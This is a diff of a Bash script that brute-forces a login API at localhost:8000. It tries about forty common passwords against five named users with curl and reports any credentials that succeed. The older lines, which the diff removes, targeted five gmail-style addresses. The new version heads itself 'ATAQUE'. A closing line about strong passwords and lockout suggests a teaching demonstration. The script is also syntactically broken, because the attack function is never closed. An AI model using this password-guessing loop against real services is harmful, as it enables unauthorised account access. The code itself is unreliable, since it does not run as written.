@@ -1,27 +1,39 @@
 #!/bin/bash
-
-API="http://localhost:8000"
-echo "=== Probando seguridad del login ==="
+API_URL="http://localhost:8000"
+echo "=== ATAQUE=="
 passwords=(
-    "ABC2024" "Pass09" "AjIplj0" "Abyss98" "bohemian"
+    "123456" "12345678" "1234" "12345" "123456789" "password" "password1" 
+    "Password" "PASSWORD" "admin" "Admin" "abc123" "123abc" "qwerty" 
+    "monkey" "letmein" "111111" "123123" "hello" "passw0rd" "master" 
+    "123" "ABC2024" "Pass09" "AjIplj0" "Abyss98" "bohemian" "secret"
+    "login" "welcome" "sunshine" "princess" "qwertyuiop" "superman"
+    "michael" "football" "baseball" "jennifer" "hannah" "michelle"
 )
-emails=("camilasolvil@gmail.com" "matias090@gmail.com" "valelemus@gmail.com" "milevilla@gmail.com" "angiefelton@gmail.com")
 
-echo "Probando ${#emails[@]} usuarios con ${#passwords[@]} contraseñas..."
-echo ""
-for email in "${emails[@]}"; do
-    echo "Atacando: $email"
-    for pass in "${passwords[@]}"; do
-        respuesta=$(curl -s -X POST "$API/login" \
+usuarios=("Camila" "Matias" "Valeria" "Milena" "Angelica")
+atacar_usuario() {
+    local usuario=$1
+    local encontrado=0
+    local intentos=0
+    echo "usuario: $usuario"    
+    for password in "${passwords[@]}"; do
+        ((intentos++))
+        respuesta=$(curl -s -X POST "$API_URL/login" \
             -H "Content-Type: application/json" \
-            -d "{\"correo\":\"$email\", \"password\":\"$pass\"}")
+            -d "{\"username\":\"$usuario\", \"password\":\"$password\"}")
+
         if echo "$respuesta" | grep -q "exitoso"; then
-            echo " ENCONTRADO: $email - $pass"
-        else
-            echo " Fallo: $pass"
+            echo "   Usuario: $usuario"
+            echo "   Contraseña: $password"
+            echo "   Intentos necesarios: $intentos"
+            echo ""
+            encontrado=1
+            break
         fi
     done
-    echo "---"
+for usuario in "${usuarios[@]}"; do
+    atacar_usuario "$usuario"
+    sleep 2  
 done
 
-echo "=== Prueba terminada ==="
+echo "de contraseñas fuertes y sistemas de bloqueo por intentos fallidos."
